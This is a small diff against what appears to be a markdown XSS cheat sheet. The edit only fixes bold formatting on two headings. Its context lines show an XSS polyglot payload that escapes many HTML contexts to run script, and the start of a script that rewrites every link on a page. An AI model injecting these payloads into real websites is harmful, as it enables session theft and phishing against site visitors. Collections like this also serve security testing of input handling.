@@ -3,7 +3,7 @@
 Few famous XSS tool
 
 
-**Polyglot payload
+**Polyglot payload**
 
 ```
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
@@ -12,7 +12,7 @@ Few famous XSS tool
 
 
 
-**Payload to replace all links
+**Payload to replace all links**
 
 ```
 Array.from(document.getElementsByTagName("a")).forEach(function(i) {
